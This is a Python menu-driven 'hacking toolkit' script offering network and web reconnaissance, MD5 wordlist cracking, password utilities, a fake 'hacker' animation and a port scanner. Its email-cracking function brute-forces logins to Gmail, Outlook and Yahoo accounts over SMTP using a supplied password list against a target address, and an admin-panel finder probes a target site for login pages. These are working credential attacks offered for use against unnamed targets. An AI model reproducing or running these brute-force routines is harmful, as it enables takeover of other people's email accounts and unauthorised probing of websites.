#created by pouya sadeghzadeh
#instagram ==> learn_time.sc
#email ==> learn.suport.1@gmail.com
#_____________________________________
try:
    import time,datetime,string,sys,webbrowser,hashlib,random,os,requests,smtplib,mechanize,whois
    from socket import *
    def main():
        help()
        if os.name == 'nt':
            print("""  
            
                        b   d8b   db d888888b d8b   db d8888b.  .d88b.  db   d8b   db .d8888. 
                        88   I8I   88   `88'   888o  88 88  `8D .8P  Y8. 88   I8I   88 88'  YP 
                        88   I8I   88    88    88V8o 88 88   88 88    88 88   I8I   88 `8bo.   
                        Y8   I8I   88    88    88 V8o88 88   88 88    88 Y8   I8I   88   `Y8b. 
                        `8b d8'8b d8'   .88.   88  V888 88  .8D `8b  d8' `8b d8'8b d8' db   8D 
                         `8b8' `8d8'  Y888888P VP   V8P Y8888D'  `Y88P'   `8b8' `8d8'  `8888Y' 
            """)
        else:
            print("""   lllllll   iiii                                                         
                        l:::::l  i::::i                                                        
                        l:::::l   iiii                                                         
                        l:::::l                                                                
                         l::::l iiiiiiinnnn  nnnnnnnn    uuuuuu    uuuuuu  xxxxxxx      xxxxxxx
                         l::::l i:::::in:::nn::::::::nn  u::::u    u::::u   x:::::x    x:::::x 
                         l::::l  i::::in::::::::::::::nn u::::u    u::::u    x:::::x  x:::::x  
                         l::::l  i::::inn:::::::::::::::nu::::u    u::::u     x:::::xx:::::x   
                         l::::l  i::::i  n:::::nnnn:::::nu::::u    u::::u      x::::::::::x    
                         l::::l  i::::i  n::::n    n::::nu::::u    u::::u       x::::::::x     
                         l::::l  i::::i  n::::n    n::::nu::::u    u::::u       x::::::::x     
                         l::::l  i::::i  n::::n    n::::nu:::::uuuu:::::u      x::::::::::x    
                        l::::::li::::::i n::::n    n::::nu:::::::::::::::uu   x:::::xx:::::x   
                        l::::::li::::::i n::::n    n::::n u:::::::::::::::u  x:::::x  x:::::x  
                        l::::::li::::::i n::::n    n::::n  uu::::::::uu:::u x:::::x    x:::::x 
                        lllllllliiiiiiii nnnnnn    nnnnnn    uuuuuuuu  uuuuxxxxxxx      xxxxxxx
            
            
            """)
            print("""  
                                                        .--.
                                                       |o_o |
                                                       |:_/ |
                                                      //   \ |
                                                     (|     | )
                                                    /'\_   _/`|
                                                    \___)=(___/ """)
        time.sleep(2)
        print("""                             (------------------------SelectTools------------------------)
[01] router scaner             
[02] admin founder             
[03] info web                  
[04] hash cracker              
[05] hash generator            
[06] password genrator         
[07] password test security    
[08] SQL-injections-#testing   
[09] hacker-show               
[10] PortScaner                
[11] email craker                              
            """)
        select=input(">>> ")
        if select == "1":
            router_scaner()
        if select == "2":

            admin_founder()
        if select == "3":
            info_web()
        if select == "4":
            hash_crack()
        if select == "5":
            hash_gn()
        if select == "6":
            pass_gn()
        if select =="7":
            pass_test()
        if select =="9":
            hacker_show()
        if  select == "8":
            SQL_injections()
        if select == "10":
            port_sc()
        if select == "11":
            email_cr()
    def router_scaner():
        print("example you ip 8.8.8.8 you just type 8.8.8.")
        ip = input('ip target :')
        list1=[]
        for i in range(1,250):
            try:
                live=gethostbyaddr(ip+str(i))
                found = ip+str(i)+' : '+live[0]
                list1.append(found)
                sys.stdout.write('\rloading |')
                time.sleep(0.1)
                sys.stdout.write('\rloading /')
                time.sleep(0.1)
                sys.stdout.write('\rloading -')
                time.sleep(0.1)
                sys.stdout.write('\rloading \\')
                time.sleep(0.1)
            except:
                sys.stdout.write('\rloading |')
                time.sleep(0.1)
                sys.stdout.write('\rloading /')
                time.sleep(0.1)
                sys.stdout.write('\rloading -')
                time.sleep(0.1)
                sys.stdout.write('\rloading \\')
                time.sleep(0.1)
        print('\n'*3)
        print('device :',len(list1))
        for ux in  list1:
            print(ux)
    def admin_founder():
        try:
            target = input("target: ")
            file = input("word list  (ENTER defult) : ")
            if len(list(file))<=0:
                path = open("admin-panels.txt","r").readlines()
            else:
                path = open(file,'r').readlines()
            list1 = []
            for i in path:
                targets = "http://" + target + "/" + i
                re = requests.get(targets)
                if re.status_code == 200:
                    print("[+]", targets)
                    list1.append(targets)
                else:
                    print('[-]cheking=>> ', targets)
            for xd in range(20):
                sys.stdout.write('\rloading |')
                time.sleep(0.1)
                sys.stdout.write('\rloading /')
                time.sleep(0.1)
                sys.stdout.write('\rloading -')
                time.sleep(0.1)
                sys.stdout.write('\rloading \\')
                time.sleep(0.1)
            print("\n" * 5)
            print(len(list1))
            input('enter to open page ')
            for ux in list1:
                print("[!]",ux)
                webbrowser.open(ux)
        except:
            print('chek internet or taget')
        input()
    def info_web():
        site = input('website: ')
        site = whois.whois(site)
        print(site)
        input()
        try:
            host = site
            print("domain name",host)
            print("addres ip",gethostbyname(host))
            dns_server =gethostbyaddr(host)
            for i in  dns_server:
                print("dns server >",i)
        except:
            print("chek internet or host")
        input()
    def hash_crack():
        try:
            print("crack md5")
            print("\n"*2)
            code = input("md5 code :")
            file = input("word list :")
            c = open(file,'r').readlines()
            for i in c:
                i = i.strip()
                if hashlib.md5(i.encode()).hexdigest() == code :
                    print("[!] cracked hash >",i)
                    quit()
                else:
                    print("check",i,hashlib.md5(i.encode()).hexdigest())
        except:
            print("chek file or code")
        input()
    def hash_gn():
        i =input("type to encode :")
        m = input("moode : example md5,sha3 244,sha3 512,sha3 384 :")
        if m == "md5":
            print("md5: ",hashlib.md5(i.encode()).hexdigest())
        elif m == "sha224":
            print("sha224 :",hashlib.sha3_224(i.encode()).hexdigest())
        else :
            print("more sha3 512 : ",hashlib.sha3_512(i.encode()).hexdigest())
            print("more sha3 384 : ", hashlib.sha3_384(i.encode()).hexdigest())
        input()
    def pass_gn():
        char = string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase + string.digits+string.punctuation
        pasword = ''.join(random.choice(char) for i in range(random.randint(10,16)))
        print(pasword)
        input()
        pass_gn()
    def pass_test():
        password = input("password :")
        num = 0
        lp = []
        pun=string.punctuation
        pun=list(pun)
        for let in password:
            if let in pun:
                if let not in lp:
                    lp.append(let)
        if len(lp)>0:
            num+=30
        lp=[]
        char2 = string.ascii_uppercase
        char2=list(char2)
        for let in password:
            if let in char2:
                if let not in lp:
                    lp.append(let)
        if len(lp)>0:
            num+=25
        lp =[]
        char3 = string.ascii_lowercase
        char3=list(char3)
        for let in password:
            if let in char3:
                if let not in lp:
                    lp.append(let)
        if len(lp) > 0:
            num+=10
        lp=[]
        char4 = string.digits
        char4=list(char4)
        for let in password:
            if let in char4:
                if let not in lp:
                    lp.append(let)
        if len(lp)>0:
            num+=10
        lp=[]
        if len(list(password))>=8:
            num+=25
        if num in range(81,101) :
            print("very good password ultra security")
        elif num in range(75,81):
            print("password good but not very good")
        if num in range(50,71):
            print("password normal")
        elif num < 50:
            print("password so bad")
        input()
    def SQL_injections():
        print("SQL-inj not now ready (ENTER)")
        input()
        main()
    def hacker_show():
        char = ['sudo$>>> metasploit msf venom -t taget set mood -s snifer set payload ...','wolf>>> snifir attack metadata [0] true false ...','ip set atack target .... [!] allert',
                'snake -p payload ckracked ... ','start']
        for i in  range(50):
            sys.stdout.write('\rloading |')
            time.sleep(0.1)
            sys.stdout.write('\rloading /')
            time.sleep(0.1)
            sys.stdout.write('\rloading -')
            time.sleep(0.1)
            sys.stdout.write('\rloading \\')
            time.sleep(0.1)
        for i in  range(1000):
            char2 = string.hexdigits
            char2 = "".join(random.choice(char2)for x in range(130))
            print(char2)
            time.sleep(0.1)
        for i in  char:
            print(i)
        print('------------------------------')
        input()
    def port_sc():
        try :
            host = input("target :")
            port = [13, 21, 22, 23, 53, 80,135,139,445,3389]
            for i in port:
                sock = socket(AF_INET, SOCK_STREAM)
                sock.settimeout(i)
                r = sock.connect_ex((host, i))
                if r == 0:
                    print("open :", i, " ", getservbyport(i))
                else:
                    print('close :', i)
            input()
        except:
            print("[!] internet connecten eror")
            input()
    def email_cr():
        print("""
        
[01] gmail
[02] outlook
[03] yaho
        
        """)
        select = input(">>> ")
      #  try:
        #    type_email=input("type smpt server: ")
         #   port =int(input("open port server smtp: "))
      #  except:
         #   print("[!] check type")
          #  quit()
        def gmail():
            smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()
            target = input("email target: ")
            password_list=input("password list: ")
            password_list=open(password_list,'r').readlines()
            for pasword in password_list:
                try:
                    smtpserver.login(target,pasword)
                    print("[+] found password : ",pasword)
                    quit()
                except smtplib.SMTPAuthenticationError:
                    print("[!] password incorrect :",pasword)
        def outlook():
            smtpserver = smtplib.SMTP("smtp.office365.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()
            target = input("email target: ")
            password_list = input("password list: ")
            password_list = open(password_list, 'r').readlines()
            for pasword in password_list:
                try:
                    smtpserver.login(target, pasword)
                    print("[+] found password : ", pasword)
                    quit()
                except smtplib.SMTPAuthenticationError:
                    print("[!] password incorrect :", pasword)
        def yaho():
            smtpserver = smtplib.SMTP("smtp.mail.yahoo.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()
            target = input("email target: ")
            password_list = input("password list: ")
            password_list = open(password_list, 'r').readlines()
            for pasword in password_list:
                try:
                    smtpserver.login(target, pasword)
                    print("[+] found password : ", pasword)
                    quit()
                except smtplib.SMTPAuthenticationError:
                    print("[-] password incorrect :", pasword)
        if select == "1":
            gmail()
        elif select == "2":
            outlook()
        elif select == "3":
            yaho()
    def help():
       print("[!] select tools by number")
    if __name__ == '__main__':
        main()
except:
    print('[!] pls install package or chek internet')
    time.sleep(3)
    quit()